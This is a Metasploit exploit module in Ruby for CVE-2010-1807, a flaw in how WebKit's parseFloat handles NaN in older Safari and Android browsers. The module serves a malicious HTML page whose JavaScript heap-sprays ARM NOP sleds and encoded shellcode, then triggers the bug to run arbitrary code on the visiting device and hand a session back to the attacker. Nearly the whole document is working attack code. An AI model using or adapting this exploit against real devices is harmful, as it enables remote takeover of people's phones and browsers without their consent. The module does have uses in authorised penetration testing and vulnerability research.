
require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'WebKit parseFloat Vulnerability',
			'Description'    => %q{
		  			WebKit in Apple Safari 4.x before 4.1.2 and 5.x before 5.0.2; Android before 2.2; 
					and webkitgtk before 1.2.6; does not properly validate floating-point data, which 
					allows remote attackers to execute arbitrary code or cause a denial of service (
					application crash) via a crafted HTML document, related to non-standard NaN 
					representation.
				},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'marcel' ],
			'References'     => [ ['CVE', '2010-1807'] ],
			'Arch'           => ARCH_ARMLE,
			'Targets'        =>
				[
					[ 'Android 2.1-update1 emulator', 
					  	{
							'Platform'       => 'linux',
							'Arch'           => ARCH_ARMLE,
						}
					],
				],
			'DisclosureDate' => 'Nov 05 2010',
			'DefaultTarget'  => 0))

	end

	def on_request_uri(cli, request)
		encoded_shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))

		html = <<-HTML
<html>
    <head><script>
    function trigger() {
        var span = document.createElement("div");
        document.getElementById("BodyID").appendChild(span);
        span.innerHTML = -parseFloat("NAN(ffffe00572c60)");
    }

    function exploit() {    
        var nop = unescape("\u33bc\u0057"); //LDREQH R3,[R7],-0x3C
        do {
            nop+=nop;
        } while (nop.length<=0x1000);
        var scode = nop + unescape("#{encoded_shellcode}");
        target = new Array();
        for (i = 0; i < 0x1000; i++) target[i] = scode;
        for (i = 0; i <= 0x1000; i++) {
            document.write(target[i]+"<i>");
            if (i>0x999) {
                trigger();
            }
        }
    }
    </script></head>
    <body id="BodyID">
        <script>
            exploit();
        </script>
    </body>
</html>
HTML

		print_status("Sending #{self.name}")
		send_response(cli, html, { 'Content-Type' => 'text/html' })

		handler(cli)
	end
end
